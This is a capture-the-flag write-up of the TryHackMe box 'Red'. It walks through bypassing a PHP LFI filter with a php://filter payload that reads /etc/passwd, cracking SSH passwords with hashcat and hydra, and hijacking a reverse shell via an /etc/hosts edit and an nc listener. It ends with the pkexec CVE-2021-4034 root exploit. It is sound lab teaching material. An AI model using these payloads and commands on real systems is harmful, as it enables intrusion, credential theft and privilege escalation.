![image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/c4197b0d-a288-408f-8754-2fc2bddf8a0b)

## This box is called Red, by THM. It was a really fun box with lots of new techniques I haven't encountered before! Hope you learn something too!

# Enumeration
As always, we're going to start with a default nmap scan to see what is up and running on the machine. 

![6_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/0cfa907b-6f90-4b83-b2b6-fc966341adf7)

As you can see, we only have two ports open, 22 (SSH), and 80 (HTTP).

The first thing I want to do is check out the website and see what we're working with.

![9_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/14d7d5d9-2ec8-4d79-be15-d3cd4f1a7bdb)

Looks like a pretty default web template. Going through the website the only interesting thing that sticks out to me is the contact page, and how the website traverses through it's pages. If you look at the URL bar, it reveals that the website is changing pages based on a php variable called `page`. For example, we have `http://10.10.131.223/index.php?page=home.html`. This is the home page. To change to the contact page, the new URL would be `http://10.10.131.223/index.php?page=contact.html`, and so on. This made me think about Local File Inclusion (LFI), being able to access certain elements on the server that we wouldn't be able to access normally.

Before we did that however, I wanted to finish enumerating the website. So I ran a ffuf directory scan on the php variable `?page=`.

![16_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/5a231a93-c9ac-442e-8243-3419472a6183)

The scan shows us that we have a page called index.php. Let's navigate to that page and see what information we can gather from it.

# Information Gathering 

Navigating to index.php and reading source code, we find the php that is actively running on the webpage.

![19_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/87bedfe7-3b33-4b8e-a6cc-34fcb814a39b)

This php is sanitizing our input to try and prevent an LFI vulnerability, but it doesn't do too good of a job.

To break this code down, we have two functions,

**Sanitization Function**: The sanitize_input function attempts to sanitize the input by removing `../` and `./` sequences from the $param. However, this approach is insufficient to prevent directory traversal attacks because an attacker can still bypass this by using URL encoded or double-encoded characters.

**Input Validation**: The code then retrieves the value of the page parameter from the URL using $_GET['page']. It checks if the page parameter is set (i.e., if it exists) and if it matches a specific pattern using a regular expression (preg_match). The pattern (/^[a-z]/) checks if the value of page starts with a lowercase letter.

**Usage of readfile**: The readfile function is used to read and output the contents of a file. If an attacker provides a malicious value for the page parameter, they can potentially include sensitive files from the server's filesystem, such as configuration files or user data.

To sum it up, the code is essentially forcing us to put payloads that start with a lowercase letter, and don't include `../` or `./`. Otherwise, it would redirect us to `home.html`.

# Exploitation

## Attempting basic LFI
With this in mind, we can try a few payloads to start. The first, and most obvious one is trying to read the `/etc/passwd` file from the system. Since the sanitize input function is only looking for `../` and `./`, we should be able to simply add `etc/passwd` to the `?page=` variable and read the data, as it matches the conditions. So our full URL would look something like this: `http://10.10.131.223/index.php?page=etc/passwd` Unfortunately, it was not this straightforward as this approach didn't work. 

The next approach I took was trying to URL encode the payload, but this didn't work either. At this point, I halted my efforts for LFI and tried uploading a php reverse shell to the machine. 


## Attempting to upload a reverse shell
The `?page=` parameter is not a local thing, it could reach out to other websites. So I tried to have the server connect to our attacking machine, and download files.

![25_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/5fc0a0b5-8082-46ed-9b67-21be0781ba14)

However once again, while we could see the files of our machine on the webserver, none of the php actually functioned, so I could never get the shell.

## Going back to LFI, with a filtered payload.
I found a very useful github cheatsheet that had a [LFI payloads list.](https://github.com/payloadbox/rfi-lfi-payload-list) In said list, I found the following payload which looked pretty promising considering all the information we gathered about the website and the filtering mechanism.

`http://example.com/index.php?page=**php://filter/read=string.rot13/resource=/etc/passwd**`

I don’t think we will need the rot13 filter, since we know what the filtering mechanism is. The updated payload now looks like this:

`http://example.com/index.php?page=**php://filter/resource=/etc/passwd**`

Remember, we have to abide by these two conditions for the server to not redirect us.

1. Payload has to start with a lowercase letter
2. Payload can't include `../` or `./`.

This payload meets both conditions, so let's try it out!

![38_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/c5a801ff-7238-4d89-8920-39cab20feb13)

The php filter worked and we have information being returned to us! I ran this payload in burp for a cleaner output, and if we look closer we find that we have 2 users, red and blue.

![40_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/70a435c5-ab00-41e0-8a98-1f3f77a29b22)

![43_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/17333fd7-7704-4554-8930-4d12c3b2eb26)


We have both of their home directories too. With this in mind, I want to try and enumerate the home directories of the users with the LFI vulnerability we discovered.

## Initial Foothold

In Linux, each user typically has a home directory where their personal files and configuration settings are stored. While the specific files may vary depending on the distribution and user's activities, there are several common files you might find in a user's home directory:

1. **.bashrc**: This file contains shell configuration settings for the Bash shell. It's executed whenever a new interactive Bash shell is started.
2. **.bash_profile**: Similar to **`.bashrc`**, this file contains shell configuration settings for Bash. It's executed when a user logs in.
3. **.profile**: This file is a generic shell startup script that's executed when a user logs in. It's not specific to any particular shell.
4. **.bash_history**: This file contains a history of the commands executed by the user in the Bash shell.
5. **.ssh**: This directory contains SSH configuration and keys used for secure communication with remote servers.
6. **.vimrc**: If the user uses the Vim text editor, this file contains Vim configuration settings.
7. **.gnupg**: This directory contains GnuPG (GPG) configuration and keys used for encryption and decryption.

Let’s enumerate each of these config files/directories, starting with the **blue** user.

1. .bashrc - worked, but nothing interesting
![144_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/594a5237-9734-4249-9e01-15d5f2227774)

2. .bash_profile - No output
![62_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/bfe820c9-5f77-412b-8b81-14d72cf2e218)


3. .profile - executed, but nothing interesting
![64_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/51503d71-adc1-46ab-868a-141044ea661c)


4. .bash_history - something interesting!
![67_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/b0cd15e6-c964-4d05-af89-fc62be498350)

Considering the context of this box, this looks like the user Red running some commands in blue's home directory. These commands are very interesting. Let's break it down.

1. `hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt`: This command uses hashcat to generate password candidates based on a ruleset (best64.rule) applied to a previously captured hash stored in a file named .reminder. The --stdout option instructs hashcat to output the generated passwords to stdout, which is then redirected (>) to a file named passlist.txt.

2. `cat passlist.txt` Red then cat's out the passlist that hashcat generated

3. `rm passlist.txt` Then they remove the password list from the directory

4. `sudo apt-get remove hashcat -y` Finally, hashcat the tool gets removed too.


We can read the .reminder file left in blue's directory with the LFI exploit we discovered, and we get a password!

![71_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/13d15a8d-663f-4f1a-af64-43aaab212b81)


So `sup3r_p@s$w0rd!` is simply a base password, and we apply the hashcat rules to it to make a wordlist that we can then use to crack blue’s password.

We can replicate this on our own machine since we HAVE the base password like so:

![76_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/363b9b05-bc0a-4130-8538-31b0b19a9528)

As you can see, after we made the wordlist I used hydra to brute force the SSH login, and NOW we have blue’s credentials! 

We can now SSH into the box as the user **blue**!

![81_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/f4d43315-3ab6-41a8-b358-488692beba53)


# Lateral Movement & Privilege Escalation
After a little bit though we start getting messages (presumably from red), taunting us, and eventually we get kicked out of the shell!

![84_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/52a9b380-dc83-4739-980c-c12a9eff462f)

I recommend that you keep the hashcat and hydra commands handy, as the password will change when you get kicked out of the shell.

Though we got taunted for it, I want to use linpeas on this machine and see if there is anything we can pick up.

We can transfer linpeas from our local machine to the victim machine in two simple steps.

**Victim machine:**

![95_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/e49f1488-eafd-4379-8c48-2724e416fecc)


**Attacking machine**

![98_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/284490d5-b66b-4f4d-8d9e-bce5c14cc0b8)

*Note: If you want to stop getting kicked out of the shell and seeing the messages from red, you can SSH into the shell with `ssh -T blue@IP`. With this command, you're not creating an interactive shell. We don't get kicked out anymore because without the TTY, it’s harder to get kicked out and identify the session ID. Though you will lose the interactive shell obviously, so it could be harder to navigate the system.*

## Notable things from Linpeas
Sudo version -- I found this [PoC](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit) with more information.

![105_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/2c8a9325-59ba-4fa5-8fd9-fd52c6959499)

Looking into this possible PrivEsc avenue, the system unfortunately does not seem vulnerable.

![108_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/d06592f4-8a1f-4ae1-941e-7fedb4974489)

The web config files:
![111_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/c0af6c16-1a3b-4859-9885-4d8212850310)

This revealed some interesting stuff, but nothing worthwhile.

## Seeing what Red is up to
Realizing the nature of this CTF, I wanted to see what the other users (in this case, Red), were up to. To do this, you can run `ps aux --forest | grep red`. If you run this command, you'll be able to see the hierarchy and relationship of any processes that match the string "red". 

![115_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/06adc0c8-df97-4556-88cd-61445eab3e9e)

These processes indicate that the user red has established reverse shell connections to the host redrules.thm on port 9001. This is a relatively common technique to maintain access or control over a machine (especially in a King Of The Hill (KOTH) setting).
 
With this in mind, let's see if we can read the /etc/hosts file and see what domains the machine is associating IPs to.
 
![122_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/b68bb2ea-31b6-4a83-b8b4-a6dd0f205908)

Looks like redrules.thm is running on an IP which isn’t on the box, which is interesting. Nevertheless, my thought process is that what if we send the revshell red is generating to OUR own ip under the redrules.thm domain? It would look something like this:

```bash
#Putting our IP in the /etc/hosts file via appending.
echo '10.2.113.254 redrules.THM' >> /etc/hosts

#Listening on our attacking machine with the same port we saw red using earlier.
nc -lvnp 9001
```

If we set up a listener on our kali machine on port 9001 and wait a little bit, we get in as red!

![127_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/77050894-19c1-4910-ba1b-71618257d7fa)

## Escalating Privileges
Now let’s explore some more of red’s home directory! The first thing that I noticed that we couldn’t read as the blue user is the `.git` directory. This contains something called **pkexec**, which I’ve never heard of.

![133_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/27227f4c-3eae-4e62-9e74-04f2be2a34a2)

A really simple google search shows us a CVE exploit regarding **pkexec**! This particular exploit was made in C, which I'm not very familiar with, so I found a [python version](https://github.com/rvizx/CVE-2021-4034/blob/main/cve-2021-4034-poc.py) of the exploit instead.

![136_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/76544c68-22dd-40a9-b896-466495f57c52)

Remember to change the path of the file because it is located in red’s directory, not in the binary folder.

![139_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/c7d0d869-a6fd-4563-b61b-0a0b9d5824ae)

All we have to do now is transfer the exploit script onto the machine (as we did earlier with Linpeas), run it, and we get root!

![143_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/b2328472-1048-4d9d-95f1-8e6159f0a57e)

Overall, I though this box was great! This is the first time I used LFI to gain a foothold on a box. I also really enjoyed exploring hashcat rules and learning how vulnerable default linux files & directories can be. Hope you learned something too, happy hacking!









